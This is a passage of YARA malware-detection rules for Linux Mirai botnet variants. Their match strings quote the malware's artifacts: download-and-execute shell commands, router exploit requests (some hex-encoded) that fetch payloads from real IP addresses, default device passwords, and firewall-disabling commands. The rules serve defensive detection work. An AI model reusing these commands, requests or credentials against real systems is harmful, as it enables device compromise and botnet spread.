rule Backdoor_Linux_Mirai_B_2147721642_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.B"
        threat_id = "2147721642"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "7"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "nmnlmevdm" ascii //weight: 1
        $x_1_2 = "XMNNCPF" ascii //weight: 1
        $x_1_3 = "egvnmacnkr" ascii //weight: 1
        $x_1_4 = "GLC@NG" ascii //weight: 1
        $x_1_5 = "Q[QVGO" ascii //weight: 1
        $x_1_6 = "LAMPPGAV" ascii //weight: 1
        $x_1_7 = "AJWLIGF" ascii //weight: 1
        $n_1_8 = "GET /shell?cat%%20/etc/passwd" ascii //weight: -1
        $n_1_9 = "GET /system.ini?loginuse&loginpas" ascii //weight: -1
    condition:
        (filesize < 20MB) and
        (not (any of ($n*))) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_B_2147721642_1
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.B"
        threat_id = "2147721642"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "attack_method_std" ascii //weight: 1
        $x_1_2 = "attack_method_tcpsyn" ascii //weight: 1
        $x_1_3 = "attack_method.c" ascii //weight: 1
        $x_1_4 = "attack_get_opt_int" ascii //weight: 1
        $x_1_5 = "anti_gdb_entry" ascii //weight: 1
        $x_1_6 = "attack_method_plainudp" ascii //weight: 1
        $x_1_7 = "attack_method_plaintcp" ascii //weight: 1
        $x_1_8 = "attack_methods" ascii //weight: 1
        $x_1_9 = "attack_methods_len" ascii //weight: 1
        $x_1_10 = "Determined we already have a instance running on this system!" ascii //weight: 1
        $x_1_11 = "Binded and listening on address %d.%d.%d.%d" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (3 of ($x*))
}

rule Backdoor_Linux_Mirai_YA_2147740926_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.YA!MTB"
        threat_id = "2147740926"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {50 4f 53 54 20 2f 63 64 6e 2d 63 67 69 2f 00 00 20 48 54 54 50 2f 31 2e 31 0d 0a 55 73 65 72 2d 41 67 65 6e 74 3a 20 00 0d 0a 48 6f 73 74 3a}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_C_2147740960_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.C"
        threat_id = "2147740960"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "7"
        strings_accuracy = "Low"
    strings:
        $x_5_1 = {63 64 20 2f 6d 6e 74 20 7c 7c 20 63 64 20 2f 72 6f 6f 74 20 7c 7c 20 63 64 20 2f 3b 20 77 67 65 74 20 68 74 74 70 3a 2f 2f [0-3] 2e [0-3] 2e [0-3] 2e [0-3] 2f 62 69 6e 73 2e 73 68 3b}  //weight: 5, accuracy: Low
        $x_5_2 = {63 64 20 2f 6d 6e 74 20 7c 7c 20 63 64 20 2f 72 6f 6f 74 20 7c 7c 20 63 64 20 2f 3b 20 77 67 65 74 20 68 74 74 70 3a 2f 2f [0-3] 2e [0-3] 2e [0-3] 2e [0-3] 2f 53 77 61 67 2e 73 68 3b}  //weight: 5, accuracy: Low
        $x_1_3 = "Bot deploy success" ascii //weight: 1
        $x_1_4 = "Bot deploy failed" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_5_*) and 2 of ($x_1_*))) or
            ((2 of ($x_5_*))) or
            (all of ($x*))
        )
}

rule Backdoor_Linux_Mirai_AY_2147754433_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.AY!MTB"
        threat_id = "2147754433"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Self Rep Fucking NeTiS and Thisity" ascii //weight: 1
        $x_1_2 = "FuCkInG FoReHeAd We BiG L33T HaxErS" ascii //weight: 1
        $x_1_3 = "User-Agent" ascii //weight: 1
        $x_1_4 = "ijvon" ascii //weight: 1
        $x_1_5 = "aJPMOG" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_AY_2147754433_1
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.AY!MTB"
        threat_id = "2147754433"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "bot.sunless.network" ascii //weight: 1
        $x_1_2 = "your device got infected by sunless IG @inboatzwetrust" ascii //weight: 1
        $x_1_3 = "found malware string in cmdline \"%s\" killing now. pid" ascii //weight: 1
        $x_1_4 = "scanlisten.sunless.network" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (2 of ($x*))
}

rule Backdoor_Linux_Mirai_D_2147756987_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.D!MTB"
        threat_id = "2147756987"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "13"
        strings_accuracy = "High"
    strings:
        $x_10_1 = "/bin/busybox CORONA" ascii //weight: 10
        $x_2_2 = {ae 39 2e e0 02 30 23 e0 22 c4 23 e0 ff 10 0c e2 2c 28 a0 e1 2c 34 a0 e1 00 00 51 e3 7f 00 51 13 ff 60 02 e2 ff 00 03 e2 2c 2c a0 e1}  //weight: 2, accuracy: High
        $x_1_3 = "hunt5759" ascii //weight: 1
        $x_1_4 = "tsgoingon" ascii //weight: 1
        $x_1_5 = "xmhdipc" ascii //weight: 1
        $x_1_6 = "synnet" ascii //weight: 1
        $x_1_7 = "epicroute" ascii //weight: 1
        $x_1_8 = "telecomadmin" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_10_*) and 3 of ($x_1_*))) or
            ((1 of ($x_10_*) and 1 of ($x_2_*) and 1 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule Backdoor_Linux_Mirai_D_2147756987_1
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.D!MTB"
        threat_id = "2147756987"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "/etc/crontab/root" ascii //weight: 1
        $x_1_2 = "rm -rf lolol.sh" ascii //weight: 1
        $x_1_3 = {62 75 73 79 62 6f 78 20 77 67 65 74 20 68 74 74 70 [0-8] 2e [0-3] 2e [0-3] 2e ?? ?? 2f 6c 6f 6c 6f 6c 2e 73 68}  //weight: 1, accuracy: Low
        $x_1_4 = {73 68 65 6c 6c 20 63 64 20 2f 74 6d 70 3b 20 77 67 65 74 20 68 74 74 70 [0-8] 2e [0-3] 2e [0-3] 2e ?? ?? 2f 6c 6f 6c 6f 6c 2e 73 68 3b 20 63 68 6d 6f 64 20 37 37 37 20 6c 6f 6c 6f 6c 2e 73 68 3b 20 73 68 20 6c 6f 6c 6f 6c 2e 73 68}  //weight: 1, accuracy: Low
        $x_1_5 = "backupmgt/localJob.php" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (4 of ($x*))
}

rule Backdoor_Linux_Mirai_E_2147761157_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.E!MTB"
        threat_id = "2147761157"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_2_1 = "chmod 777 * /tmp/skere" ascii //weight: 2
        $x_2_2 = "/bin/busybox" ascii //weight: 2
        $x_1_3 = "-l /tmp/skere -r /911.mips" ascii //weight: 1
        $x_1_4 = {00 20 9e e5 02 30 dc e7 03 30 20 e0 02 30 cc e7 00 10 9e e5 01 30 dc e7 03 30 26 e0 01 30 cc e7 00 20 9e e5 02 30 dc e7 03 30 25 e0 02 30 cc e7 00 10 9e e5 01 30 dc e7 03 30 24 e0 01 30 cc e7 04 20 de e5 01 30 d7 e5 01 c0 8c e2 03 24 82 e1 0c 00 52 e1 e9 ff ff ca f0 80 bd e8}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (
            ((2 of ($x_2_*) and 1 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule Backdoor_Linux_Mirai_F_2147761158_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.F!MTB"
        threat_id = "2147761158"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_2_1 = "wget -O -> wwww; sh wwww" ascii //weight: 2
        $x_2_2 = "shell:cd /data/local/tmp; busybox" ascii //weight: 2
        $x_1_3 = {47 45 54 20 2f 63 67 69 2d 62 69 6e 2f 6b 65 72 62 79 6e 65 74 3f 53 65 63 74 69 6f 6e 3d 4e 6f 41 75 74 68 52 45 51 26 41 63 74 69 6f 6e 3d 78 35 30 39 4c 69 73 74 26 74 79 70 65 3d 2a 25 32 32 3b 63 64 25 32 30 25 32 46 74 6d 70 3b 63 75 72 6c 25 32 30 2d 4f 25 32 30 68 74 74 70 25 33 41 25 32 46 25 32 46 35 2e 32 30 36 2e 32 32 37 2e 32 32 38 25 32 46 7a 65 72 6f 3b 73 68 25 32 30 7a 65 72 6f 3b 25 32 32 20 48 54 54 50 2f 31 2e 30 0d 0a 0d 0a 00 17 00}  //weight: 1, accuracy: High
        $x_1_4 = {47 45 54 20 2f 73 68 65 6c 6c 3f 63 64 25 32 30 2f 74 6d 70 3b 77 67 65 74 25 32 30 68 74 74 70 25 33 41 25 32 46 25 32 46 35 2e 32 30 36 2e 32 32 37 2e 32 32 38 25 32 46 6a 61 77 3b 73 68 25 32 30 6a 61 77 3b 20 48 54 54 50 2f 31 2e 30 0d 0a 0d 0a 00}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (
            ((2 of ($x_2_*) and 1 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule Backdoor_Linux_Mirai_G_2147761159_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.G!MTB"
        threat_id = "2147761159"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_2_1 = "/bin/busybox tftp -r bot.%s" ascii //weight: 2
        $x_2_2 = "chmod 777 .t; ./.t telnet." ascii //weight: 2
        $x_1_3 = "GET /bot." ascii //weight: 1
        $x_1_4 = "%d.%d.%d.%d/bot.%s -O" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((2 of ($x_2_*) and 1 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule Backdoor_Linux_Mirai_I_2147761774_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.I!MTB"
        threat_id = "2147761774"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "attack_udp_simple" ascii //weight: 1
        $x_1_2 = "attack_udpmop" ascii //weight: 1
        $x_1_3 = "kill_attacks" ascii //weight: 1
        $x_1_4 = "cmd_not_attack" ascii //weight: 1
        $x_1_5 = "killer_run" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (3 of ($x*))
}

rule Backdoor_Linux_Mirai_K_2147761775_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.K!MTB"
        threat_id = "2147761775"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "dark_nexus" ascii //weight: 1
        $x_1_2 = "/bin/busybox" ascii //weight: 1
        $x_1_3 = "switchnets.net" ascii //weight: 1
        $x_1_4 = "thiccnigga.me" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (3 of ($x*))
}

rule Backdoor_Linux_Mirai_L_2147762520_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.L!MTB"
        threat_id = "2147762520"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "killallbots" ascii //weight: 1
        $x_1_2 = "/bin/busybox OBOT" ascii //weight: 1
        $x_1_3 = "attack_send" ascii //weight: 1
        $x_1_4 = "killer_sendback" ascii //weight: 1
        $x_1_5 = "/usr/lib/polkit-1/polkitd" ascii //weight: 1
        $x_1_6 = "/bin/hgcmegaco" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (3 of ($x*))
}

rule Backdoor_Linux_Mirai_N_2147763162_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.N!MTB"
        threat_id = "2147763162"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "/proc/cpuinfo" ascii //weight: 1
        $x_1_2 = "attack_udpgame " ascii //weight: 1
        $x_1_3 = "attack_get_opt_int" ascii //weight: 1
        $x_1_4 = "attack_tcpall " ascii //weight: 1
        $x_1_5 = "attack_voltudp " ascii //weight: 1
        $x_1_6 = "attack_tcpurg" ascii //weight: 1
        $x_1_7 = "scanner_init" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (3 of ($x*))
}

rule Backdoor_Linux_Mirai_Aa_2147763163_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.Aa!MTB"
        threat_id = "2147763163"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {62 75 73 79 62 6f 78 20 77 67 65 74 20 2d 67 20 [0-3] 2e [0-3] 2e [0-3] 2e [0-3] 20 2d 6c 20 2f 74 6d 70 2f 62 69 67 48}  //weight: 1, accuracy: Low
        $x_1_2 = {2f 62 69 6e 73 2f [0-16] 6d 69 70 73 3b 63 68 6d 6f 64 20 37 37 37 20 2f 74 6d 70 2f 62 69 67 48}  //weight: 1, accuracy: Low
        $x_1_3 = "/tmp/bigH huawei.rep.mips;rm -rf /tmp/bigH" ascii //weight: 1
        $x_1_4 = "/tmp/bigH rep.huawei;rm -rf /tmp/bigH" ascii //weight: 1
        $x_1_5 = "ttcp_ip=-h+%60cd+%2Ftmp%3B+rm+-rf+mpsl%3B+wget+http%3A%2F%2F139.59.209.204%2Fbins%2Fmpsl%3B+chmod+777+mpsl%3B+.%2Fmpsl+linksys%60&action=&ttcp_num=2&ttcp_size=2&submit_button=&change_action=&commit=0&StartEPI=1" ascii //weight: 1
        $x_1_6 = "Self Rep Fucking NeTiS and Thisity 0n Ur FuCkInG FoReHeAd We BiG L33T HaxErS" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (3 of ($x*))
}

rule Backdoor_Linux_Mirai_Ab_2147763217_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.Ab!MTB"
        threat_id = "2147763217"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "GET /shell?cd+/tmp;rm+-rf" ascii //weight: 1
        $x_1_2 = {62 75 73 79 62 6f 78 20 77 67 65 74 20 2d 67 [0-32] 2d 6c 20 2f 74 6d 70 2f 62 69 67 48 20 2d 72}  //weight: 1, accuracy: Low
        $x_1_3 = "/beastmode/b3astmode.mips;chmod 777 /tmp/bigH" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_Ac_2147763447_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.Ac!MTB"
        threat_id = "2147763447"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "killer] scanning %s" ascii //weight: 1
        $x_1_2 = "Multihop attempted" ascii //weight: 1
        $x_1_3 = {8b 19 89 d0 01 d8 89 eb 30 18 89 d0 8b 19 01 d8 89 fb 30 18 89 d0 8b 19 01 d8 89 f3 30 18 89 d0 8b 19 42 01 d8 8a 1c 24 30 18 8b 41 04 25 ff ff 00 00 39 d0 7f ca}  //weight: 1, accuracy: High
        $x_1_4 = {68 2b 64 05 08 e8 f6 30 00 00 e8 ee 2d 00 00 66 c7 05 14 b3 05 08 02 00 a3 08 b3 05 08 c7 05 18 b3 05 08 41 de ca 35 66 c7 05 16 b3 05 08 00 50 e8 58 1f 00 00 c7 05 70 90 05 08 d0 eb 04 08 e8 59 fd ff ff e8 b4 06 00 00 58 5a 6a 20 8d ac 24 ac 05 00 00 55 e8 c3 2b 00 00 83 c4 10 83 fe 02 0f 84 98 00 00 00}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_Ad_2147763448_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.Ad!MTB"
        threat_id = "2147763448"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "canscan" ascii //weight: 1
        $x_1_2 = "killallbots" ascii //weight: 1
        $x_1_3 = "imagine threading ur bots smh" ascii //weight: 1
        $x_1_4 = "/udpplain" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_2147764081_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.ba!MTB"
        threat_id = "2147764081"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "ba: an internal category used to refer to some threats"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "4E/x31/x6B/x4B/x31/x20/x21/x73/x69/x20/x4D/x33/x75/x79/x20/x4C/x30/x56/x72/x33/x20/x3C/x33/x20/x50/x61/x32/x72/x43/x48/x20/x4D/x32/x20/x41/x34/x34/x72/x43/x4B" ascii //weight: 1
        $x_1_2 = "h?t?t?p??h?e?x????h?t?t?p??h?e?x????h?t?t?p??h?e?x????h?t?t?p??f?l?o?o?d????h?t?t?p??f?l?o?o?d????h?t?t?p??f?l?o?o?d??" ascii //weight: 1
        $x_1_3 = "Self Rep Fucking NeTiS and Thisity 0n Ur FuCkInG FoReHeAd We" ascii //weight: 1
        $x_1_4 = "Proximity-Killers" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (2 of ($x*))
}

rule Backdoor_Linux_Mirai_2147764150_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.bc!MTB"
        threat_id = "2147764150"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "bc: an internal category used to refer to some threats"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {62 69 6e 2f 62 75 73 79 62 6f 78 20 77 67 65 74 20 ?? ?? ?? ?? 3a 2f 2f [0-3] 2e [0-3] 2e [0-3] 2e [0-3] 2f 62 69 6e 73 2f 6d 69 72 61 69 2e 6d 69 70 73 20 2d 4f 20 66 61 67 67 58 44 3b 20 2f 62 69 6e 2f 62 75 73 79 62 6f 78 20 63 68 6d 6f 64 20 37 37 37 20 66 61 67 67 58 44 3b 20 2e 2f 66 61 67 67 58 44 29 3c 2f 4e 65 77 53 74 61 74 75 73 55 52 4c 3e 3c 4e 65 77 44 6f 77 6e 6c 6f 61 64 55 52 4c 3e}  //weight: 1, accuracy: Low
        $x_1_2 = {3c 4e 65 77 49 6e 74 65 72 6e 61 6c 43 6c 69 65 6e 74 3e 60 63 64 20 2f 76 61 72 3b 20 72 6d 20 2d 72 66 20 6e 69 67 3b 20 77 67 65 74 20 ?? ?? ?? ?? 3a 2f 2f [0-3] 2e [0-3] 2e [0-3] 2e [0-3] 2f 72 74 62 69 6e 20 2d 4f 20 6e 69 67 3b 20 63 68 6d 6f 64 20 37 37 37 20 6e 69 67 3b 20 2e 2f 6e 69 67}  //weight: 1, accuracy: Low
        $x_1_3 = "INFECTED" ascii //weight: 1
        $x_1_4 = "killer_kill_by_port" ascii //weight: 1
        $x_1_5 = "realtekscanner_scanner_kill" ascii //weight: 1
        $x_1_6 = "ak47telscan" ascii //weight: 1
        $x_1_7 = "dnsflood" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (4 of ($x*))
}

rule Backdoor_Linux_Mirai_2147764151_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.bd!MTB"
        threat_id = "2147764151"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "bd: an internal category used to refer to some threats"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "/var/bin;wget -O dmips %s;chmod +x /var/bin/dmips;(killall -9 telnetd || kill -9 telnetd" ascii //weight: 1
        $x_1_2 = "exploit failed" ascii //weight: 1
        $x_1_3 = "HTTP %s flooding %s with %d power" ascii //weight: 1
        $x_1_4 = "also not a ddos packet" ascii //weight: 1
        $x_1_5 = "phpbot" ascii //weight: 1
        $x_1_6 = "bypassing auth" ascii //weight: 1
        $x_1_7 = "AK-47 SCANNER STARTED!" ascii //weight: 1
        $x_1_8 = "Killing pid %d" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (5 of ($x*))
}

rule Backdoor_Linux_Mirai_2147764418_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.be!MTB"
        threat_id = "2147764418"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "be: an internal category used to refer to some threats"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "/bin/busybox tftp -g -l dvrHelper" ascii //weight: 1
        $x_2_2 = "mirai.arm" ascii //weight: 2
        $x_1_3 = "chmod +x dvrHelper; ./dvrHelper" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_2_*) and 1 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule Backdoor_Linux_Mirai_2147764419_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.bf!MTB"
        threat_id = "2147764419"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "bf: an internal category used to refer to some threats"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "7"
        strings_accuracy = "High"
    strings:
        $x_5_1 = "\\x59\\x6f\\x75\\x41\\x69\\x6e\\x74\\x46\\x75\\x63\\x6b\\x4d\\x65\\x59\\x6f\\x75\\x46\\x75\\x63\\x6b\\x57\\x69\\x74\\x68\\x4d\\x79\\x42\\x6f\\x74\\x4e\\x65\\x74\\x4c\\x69\\x6c\\x42\\x69\\x74\\x63\\x68" ascii //weight: 5
        $x_1_2 = "BypassesAreForSkidsUwU" ascii //weight: 1
        $x_1_3 = "UDPRAW" ascii //weight: 1
        $x_1_4 = "udphex" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_5_*) and 2 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule Backdoor_Linux_Mirai_CA_2147766384_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.CA!MTB"
        threat_id = "2147766384"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {f0 40 2d e9 48 70 9f e5 00 20 97 e5 03 00 52 e3 40 60 9f e5 01 50 82 e2 21 4c a0 e1 21 c4 a0 e1 21 e8 a0 e1 ff 00 00 e2 f0 80 bd 08 05 30 a0 e3 93 02 02 e0 06 30 82 e0 06 00 c2 e7 00 50 87 e5 04 40 c3 e5 02 c0 c3 e5 03 e0 c3 e5 01 10 c3 e5 f0 80 bd e8}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_CA_2147766384_1
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.CA!MTB"
        threat_id = "2147766384"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "13"
        strings_accuracy = "High"
    strings:
        $x_10_1 = "/bin/busybox MIRAI" ascii //weight: 10
        $x_1_2 = "vstarcam2015" ascii //weight: 1
        $x_1_3 = "telecomadmin" ascii //weight: 1
        $x_1_4 = "toor" ascii //weight: 1
        $x_1_5 = "udpplain" ascii //weight: 1
        $x_1_6 = "tcpraw" ascii //weight: 1
        $x_1_7 = "adm1234intelecom" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_10_*) and 3 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule Backdoor_Linux_Mirai_CB_2147766396_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.CB!MTB"
        threat_id = "2147766396"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "hackmy" ascii //weight: 1
        $x_1_2 = "mirai.linux" ascii //weight: 1
        $x_1_3 = "busybotnet" ascii //weight: 1
        $x_1_4 = "GALAXY ] Removing Temp Directorys. || IP: %s || Port: 23 || Username: %s || Password: %s" ascii //weight: 1
        $x_1_5 = "pkill -9 %s;killall -9 %s;" ascii //weight: 1
        $x_1_6 = "service iptables stop" ascii //weight: 1
        $x_1_7 = "service firewalld stop" ascii //weight: 1
        $x_1_8 = "MiraiScanner" ascii //weight: 1
        $x_1_9 = "TelnetScanner" ascii //weight: 1
        $x_1_10 = "MiraiIPRanges" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (5 of ($x*))
}

rule Backdoor_Linux_Mirai_CC_2147766397_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.CC!MTB"
        threat_id = "2147766397"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
